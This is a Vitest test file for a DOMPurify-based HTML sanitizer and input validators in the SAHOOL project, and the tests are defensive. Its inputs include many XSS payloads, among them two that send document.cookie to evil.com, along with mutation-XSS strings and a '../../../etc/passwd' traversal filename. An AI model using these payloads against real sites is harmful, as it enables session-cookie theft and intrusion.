/**
 * SAHOOL Validation and Sanitization Tests
 * اختبارات التحقق والتعقيم
 *
 * Comprehensive tests for DOMPurify-based HTML sanitization and validation
 */

import { describe, it, expect } from 'vitest';
import { validators, sanitizers, validateInput, validateForm, isFormValid } from '../validation';

// ═══════════════════════════════════════════════════════════════════════════
// HTML Sanitizer Tests (DOMPurify-based)
// ═══════════════════════════════════════════════════════════════════════════

describe('sanitizers.html (DOMPurify)', () => {
  describe('Basic HTML stripping', () => {
    it('should remove simple HTML tags', () => {
      const input = '<p>Hello World</p>';
      const result = sanitizers.html(input);
      expect(result).toBe('Hello World');
    });

    it('should remove multiple HTML tags', () => {
      const input = '<div><span>Hello</span> <strong>World</strong></div>';
      const result = sanitizers.html(input);
      expect(result).toBe('Hello World');
    });

    it('should remove nested HTML tags', () => {
      const input = '<div><p><span><b>Deep nesting</b></span></p></div>';
      const result = sanitizers.html(input);
      expect(result).toBe('Deep nesting');
    });

    it('should keep text content while removing tags', () => {
      const input = 'Text before <script>alert("XSS")</script> text after';
      const result = sanitizers.html(input);
      expect(result).toBe('Text before  text after');
    });
  });

  describe('XSS attack vector prevention', () => {
    it('should neutralize basic script tag injection', () => {
      const input = '<script>alert("XSS")</script>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
    });

    it('should neutralize img tag with onerror', () => {
      const input = '<img src=x onerror=alert("XSS")>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<img');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('should neutralize iframe injection', () => {
      const input = '<iframe src="javascript:alert(1)"></iframe>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('javascript:');
    });

    it('should neutralize javascript: protocol', () => {
      const input = '<a href="javascript:alert(1)">Click me</a>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<a');
      expect(result).not.toContain('javascript:');
      expect(result).toBe('Click me');
    });

    it('should neutralize data: protocol', () => {
      const input = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('data:');
      expect(result).not.toContain('<script');
    });

    it('should neutralize vbscript: protocol', () => {
      const input = '<a href="vbscript:msgbox(1)">Click</a>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('vbscript:');
    });

    it('should neutralize inline event handlers', () => {
      const input = '<div onclick="alert(1)" onmouseover="alert(2)">Hover me</div>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onmouseover');
      expect(result).toBe('Hover me');
    });
  });

  describe('Advanced XSS bypass attempts (that regex fails to catch)', () => {
    it('should handle already-encoded HTML (safe as-is)', () => {
      const input = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
      const result = sanitizers.html(input);
      // HTML entities are already safe - DOMPurify leaves them as-is
      // This is correct behavior - encoded HTML is safe to display
      expect(result).toBe('&lt;script&gt;alert("XSS")&lt;/script&gt;');
    });

    it('should neutralize mixed case script tags', () => {
      const input = '<ScRiPt>alert("XSS")</sCrIpT>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('alert');
    });

    it('should neutralize script with null bytes', () => {
      const input = '<script\x00>alert("XSS")</script>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<script');
      // Content may remain but tags are removed (safe)
    });

    it('should neutralize SVG with script', () => {
      const input = '<svg><script>alert(1)</script></svg>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<svg');
      expect(result).not.toContain('alert');
    });

    it('should neutralize mathml with script', () => {
      const input = '<math><script>alert(1)</script></math>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<math');
      expect(result).not.toContain('alert');
    });

    it('should handle nested encoded attacks (safe as text)', () => {
      const input = '<div>&lt;img src=x onerror=alert(1)&gt;</div>';
      const result = sanitizers.html(input);
      // The div tag is removed, encoded content remains (which is safe as text)
      expect(result).not.toContain('<div');
      expect(result).toBe('&lt;img src=x onerror=alert(1)&gt;');
    });

    it('should neutralize style tag with expression', () => {
      const input = '<style>body{background:url("javascript:alert(1)")}</style>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('alert');
    });

    it('should neutralize object/embed tags', () => {
      const input = '<object data="javascript:alert(1)"></object>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<object');
      expect(result).not.toContain('javascript:');
    });

    it('should neutralize base tag injection', () => {
      const input = '<base href="javascript:alert(1)">';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<base');
      expect(result).not.toContain('javascript:');
    });

    it('should neutralize meta refresh injection', () => {
      const input = '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<meta');
      expect(result).not.toContain('javascript:');
    });
  });

  describe('Edge cases', () => {
    it('should handle empty string', () => {
      expect(sanitizers.html('')).toBe('');
    });

    it('should handle plain text without HTML', () => {
      const input = 'Just plain text';
      expect(sanitizers.html(input)).toBe('Just plain text');
    });

    it('should handle special characters (encodes them safely)', () => {
      const input = 'Text with & < > " \' characters';
      const result = sanitizers.html(input);
      // DOMPurify encodes dangerous characters for safety
      expect(result).toContain('&amp;');
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
    });

    it('should handle Arabic text', () => {
      const input = '<p>مرحبا بك في سهول</p>';
      const result = sanitizers.html(input);
      expect(result).toBe('مرحبا بك في سهول');
    });

    it('should handle mixed Arabic and HTML', () => {
      const input = '<div>النص <script>alert("خطر")</script> آمن</div>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<script');
      expect(result).toContain('النص');
      expect(result).toContain('آمن');
    });

    it('should trim whitespace', () => {
      const input = '  <p>text</p>  ';
      const result = sanitizers.html(input);
      expect(result).toBe('text');
    });

    it('should handle null input', () => {
      expect(sanitizers.html(null as any)).toBe('');
    });

    it('should handle undefined input', () => {
      expect(sanitizers.html(undefined as any)).toBe('');
    });

    it('should handle non-string input', () => {
      expect(sanitizers.html(123 as any)).toBe('');
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should neutralize stored XSS attack', () => {
      const userInput = '<img src=x onerror="fetch(`https://evil.com?cookie=${document.cookie}`)">';
      const result = sanitizers.html(userInput);
      expect(result).not.toContain('<img');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('fetch');
      expect(result).not.toContain('evil.com');
    });

    it('should neutralize reflected XSS via comment', () => {
      const userComment = 'Great post! <script>document.location="http://evil.com?c="+document.cookie</script>';
      const result = sanitizers.html(userComment);
      expect(result).toBe('Great post!');
    });

    it('should neutralize DOM-based XSS attempt', () => {
      const input = '<div id="x"><script>document.getElementById("x").innerHTML=location.hash.slice(1)</script></div>';
      const result = sanitizers.html(input);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('innerHTML');
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// SafeText Validator Tests (DOMPurify-based)
// ═══════════════════════════════════════════════════════════════════════════

describe('validators.safeText (DOMPurify)', () => {
  describe('Safe text validation', () => {
    it('should accept plain text', () => {
      expect(validators.safeText('Hello World')).toBe(true);
    });

    it('should accept text with special characters', () => {
      expect(validators.safeText('Text with !@#$%^&*() characters')).toBe(true);
    });

    it('should accept Arabic text', () => {
      expect(validators.safeText('مرحبا بك في سهول')).toBe(true);
    });

    it('should accept numbers', () => {
      expect(validators.safeText('12345')).toBe(true);
    });

    it('should accept mixed content', () => {
      expect(validators.safeText('User123: Hello!')).toBe(true);
    });
  });

  describe('Unsafe text detection', () => {
    it('should reject HTML tags', () => {
      expect(validators.safeText('<p>text</p>')).toBe(false);
    });

    it('should reject script tags', () => {
      expect(validators.safeText('<script>alert("XSS")</script>')).toBe(false);
    });

    it('should reject img with onerror', () => {
      expect(validators.safeText('<img src=x onerror=alert(1)>')).toBe(false);
    });

    it('should reject javascript: protocol', () => {
      expect(validators.safeText('javascript:alert(1)')).toBe(false);
    });

    it('should reject data: protocol', () => {
      expect(validators.safeText('data:text/html,<script>alert(1)</script>')).toBe(false);
    });

    it('should reject iframe', () => {
      expect(validators.safeText('<iframe src="evil.com"></iframe>')).toBe(false);
    });

    it('should reject inline event handlers', () => {
      expect(validators.safeText('text onclick=alert(1)')).toBe(false);
    });

    it('should accept encoded HTML (already safe as text)', () => {
      // HTML entities are safe - they display as text, not execute
      expect(validators.safeText('&lt;script&gt;alert(1)&lt;/script&gt;')).toBe(true);
    });
  });

  describe('Edge cases', () => {
    it('should reject empty string', () => {
      expect(validators.safeText('')).toBe(false);
    });

    it('should reject null', () => {
      expect(validators.safeText(null as any)).toBe(false);
    });

    it('should reject undefined', () => {
      expect(validators.safeText(undefined as any)).toBe(false);
    });

    it('should reject non-string', () => {
      expect(validators.safeText(123 as any)).toBe(false);
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// Other Validator Tests
// ═══════════════════════════════════════════════════════════════════════════

describe('validators', () => {
  describe('twoFactorCode', () => {
    it('should accept valid 6-digit code', () => {
      expect(validators.twoFactorCode('123456')).toBe(true);
    });

    it('should reject non-6-digit code', () => {
      expect(validators.twoFactorCode('12345')).toBe(false);
      expect(validators.twoFactorCode('1234567')).toBe(false);
    });

    it('should reject non-numeric code', () => {
      expect(validators.twoFactorCode('12345a')).toBe(false);
    });
  });

  describe('email', () => {
    it('should accept valid email', () => {
      expect(validators.email('user@example.com')).toBe(true);
    });

    it('should reject invalid email', () => {
      expect(validators.email('invalid')).toBe(false);
      expect(validators.email('@example.com')).toBe(false);
      expect(validators.email('user@')).toBe(false);
    });
  });

  describe('password', () => {
    it('should accept strong password', () => {
      expect(validators.password('StrongP@ss123')).toBe(true);
    });

    it('should reject weak password', () => {
      expect(validators.password('weak')).toBe(false);
      expect(validators.password('nouppercaseornumber!')).toBe(false);
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// Other Sanitizer Tests
// ═══════════════════════════════════════════════════════════════════════════

describe('sanitizers', () => {
  describe('escape', () => {
    it('should escape HTML entities', () => {
      const input = '<script>alert("XSS")</script>';
      const result = sanitizers.escape(input);
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
      expect(result).not.toContain('<script');
    });
  });

  describe('email', () => {
    it('should sanitize email', () => {
      expect(sanitizers.email('  USER@EXAMPLE.COM  ')).toBe('user@example.com');
    });
  });

  describe('phone', () => {
    it('should sanitize phone number', () => {
      expect(sanitizers.phone('+1 (555) 123-4567')).toBe('+1 555 123-4567');
    });
  });

  describe('filename', () => {
    it('should sanitize filename', () => {
      expect(sanitizers.filename('../../../etc/passwd')).toBe('___etc_passwd');
      expect(sanitizers.filename('file<script>.txt')).toBe('file_script_.txt');
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// Integration Tests
// ═══════════════════════════════════════════════════════════════════════════

describe('validateInput', () => {
  it('should validate and sanitize email', () => {
    const result = validateInput('  user@EXAMPLE.com  ', 'email');
    expect(result.isValid).toBe(true);
    expect(result.value).toBe('user@example.com');
    expect(result.error).toBeUndefined();
  });

  it('should return error for invalid email', () => {
    const result = validateInput('invalid', 'email');
    expect(result.isValid).toBe(false);
    expect(result.error).toBeTruthy();
  });

  it('should validate safeText with DOMPurify', () => {
    const result = validateInput('Safe text', 'safeText');
    expect(result.isValid).toBe(true);
    expect(result.value).toBe('Safe text');
  });

  it('should reject unsafe text', () => {
    const result = validateInput('<script>alert(1)</script>', 'safeText');
    expect(result.isValid).toBe(false);
    expect(result.error).toBeTruthy();
  });
});

describe('validateForm', () => {
  it('should validate multiple fields', () => {
    const inputs = {
      email: 'user@example.com',
      code: '123456',
      comment: 'This is safe',
    };
    const rules = {
      email: 'email' as const,
      code: 'twoFactorCode' as const,
      comment: 'safeText' as const,
    };
    const results = validateForm(inputs, rules);
    expect(results.email.isValid).toBe(true);
    expect(results.code.isValid).toBe(true);
    expect(results.comment.isValid).toBe(true);
  });

  it('should detect XSS in form field', () => {
    const inputs = {
      comment: '<script>alert("XSS")</script>',
    };
    const rules = {
      comment: 'safeText' as const,
    };
    const results = validateForm(inputs, rules);
    expect(results.comment.isValid).toBe(false);
  });
});

describe('isFormValid', () => {
  it('should return true when all fields valid', () => {
    const results = {
      email: { isValid: true, value: 'user@example.com' },
      code: { isValid: true, value: '123456' },
    };
    expect(isFormValid(results)).toBe(true);
  });

  it('should return false when any field invalid', () => {
    const results = {
      email: { isValid: true, value: 'user@example.com' },
      code: { isValid: false, value: '12345', error: 'Invalid code' },
    };
    expect(isFormValid(results)).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// Security Regression Tests
// ═══════════════════════════════════════════════════════════════════════════

describe('Security regression tests', () => {
  it('should prevent mutation XSS attacks', () => {
    const input = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
    const result = sanitizers.html(input);
    expect(result).not.toContain('<img');
    expect(result).not.toContain('onerror');
  });

  it('should prevent mXSS via namespace confusion', () => {
    const input = '<svg><p><style><a title="</style><img src=x onerror=alert(1)>">';
    const result = sanitizers.html(input);
    expect(result).not.toContain('onerror');
  });

  it('should prevent CSS expression injection', () => {
    const input = '<div style="width:expression(alert(1))">text</div>';
    const result = sanitizers.html(input);
    expect(result).not.toContain('expression');
    expect(result).toBe('text');
  });

  it('should handle extremely long input safely', () => {
    const input = '<p>' + 'A'.repeat(100000) + '</p>';
    const result = sanitizers.html(input);
    expect(result).toBe('A'.repeat(100000));
  });

  it('should handle deeply nested HTML', () => {
    let input = 'text';
    for (let i = 0; i < 100; i++) {
      input = `<div>${input}</div>`;
    }
    const result = sanitizers.html(input);
    expect(result).toBe('text');
  });
});
